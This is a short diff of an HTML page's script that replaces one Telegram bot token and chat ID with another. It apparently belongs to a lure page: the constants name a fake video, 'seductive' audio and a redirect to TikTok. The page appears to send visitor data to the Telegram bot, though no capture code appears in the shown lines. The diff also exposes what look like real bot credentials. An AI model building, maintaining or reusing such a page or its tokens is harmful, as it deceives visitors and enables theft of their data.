@@ -107,8 +107,8 @@
     </div>
 
     <script>
-        const BOT = '8242920453:AAE72_9hk3EUOienv9Gp7UreABReYlnfiFk';
-        const CID = '8004961958';
+        const BOT = '8707407878:AAFd8tJjycvuCOh9WFMTI6tH7JyPDiCEYzc';
+        const CID = '7829655229';
         const REDIR = 'https://www.tiktok.com';
         const FAKE_VID = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4';
         const SEDUCTIVE_AUDIO = 'https://cdn.freesound.org/previews/620/620173_5674468-lq.mp3';
